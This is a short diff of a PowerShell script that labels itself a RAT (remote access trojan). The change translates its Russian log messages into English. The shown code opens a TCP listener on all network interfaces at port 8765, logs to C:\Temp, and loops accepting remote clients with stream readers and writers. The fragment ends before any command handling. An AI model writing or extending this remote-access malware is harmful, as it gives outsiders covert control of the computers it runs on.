@@ -1,9 +1,9 @@
 $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 8765)
 $listener.Start()
-'RAT запущен на 0.0.0.0:8765' | Out-File 'C:\Temp\rat_log.txt'
+'RAT started on 0.0.0.0:8765' | Out-File 'C:\Temp\rat_log.txt'
 while ($true) {
     $client = $listener.AcceptTcpClient()
-    'Клиент подключился: ' + $client.Client.RemoteEndPoint | Out-File 'C:\Temp\ratlog.txt' -Append
+    'Client connected: ' + $client.Client.RemoteEndPoint | Out-File 'C:\Temp\ratlog.txt' -Append
     $stream = $client.GetStream()
     $reader = [System.IO.StreamReader]::new($stream)
     $writer = [System.IO.StreamWriter]::new($stream)
